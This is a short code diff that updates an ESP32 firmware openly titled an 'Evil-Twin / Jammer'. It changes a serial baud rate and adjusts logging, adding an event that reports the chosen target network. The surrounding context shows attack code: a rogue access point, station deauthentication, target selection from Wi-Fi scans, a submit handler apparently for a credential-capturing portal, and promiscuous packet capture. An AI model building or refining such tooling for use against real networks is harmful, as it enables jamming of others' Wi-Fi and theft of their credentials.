@@ -1,5 +1,5 @@
 /* =========================================================
-   ESP32 Evil-Twin / Jammer v7.3.1 — Optimized & Filtered
+   ESP32 Evil-Twin / Jammer v7.3.3 — Final Refined & Cleaned
    ========================================================= */
 #include <WiFi.h>
 #include <WebServer.h>
@@ -7,7 +7,7 @@
 #include <esp_wifi.h>
 #include <HardwareSerial.h>
 
-#define BT_BAUD 115200          
+#define BT_BAUD 9600          
 HardwareSerial BT(2);         
 #define CTL BT
 
@@ -307,7 +307,7 @@ void hardStop() {
   WiFi.softAP("ESP32-TWIN", NULL, apCh, 0, AP_MAXCONN);
   esp_wifi_deauth_sta(0);
   cliN = 0; rotIdx = 0; assocIdx = 0;
-  ev("EV OFF");
+  // EV OFF removed to prevent duplicate with caller EV STOPPED
 }
 
 void handleSubmit() {
@@ -352,7 +352,7 @@ void doScan() {
     ev("AP " + String(scanCount - 1) + " " + String(e.rssi) + " " + String(e.ch) + " " +
        String(e.enc) + " " + encName(e.enc) + " " + diffTag(e) + " " + String(e.ssid));
   }
-  WiFi.scanDelete(); ev("EV SCAN end");
+  WiFi.scanDelete(); ev("EV SCAN end " + String(scanCount));
 
   if (was && tcount > 0) {
     wifi_promiscuous_filter_t fl = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
@@ -378,6 +378,8 @@ void startTargets(const int *idx, int n) {
     tg[tcount].ch = scanList[i].ch; tcount++;
   }
   if (!tcount) { ev("EV ERR no-target"); return; }
+
+  ev("EV PICK " + String(scanList[idx[0]].ssid) + " " + String(scanList[idx[0]].rssi));
 
   cliN = 0; rotIdx = 0; assocIdx = 0; rotOn = (tcount > 1);
   apCh = tg[0].ch;
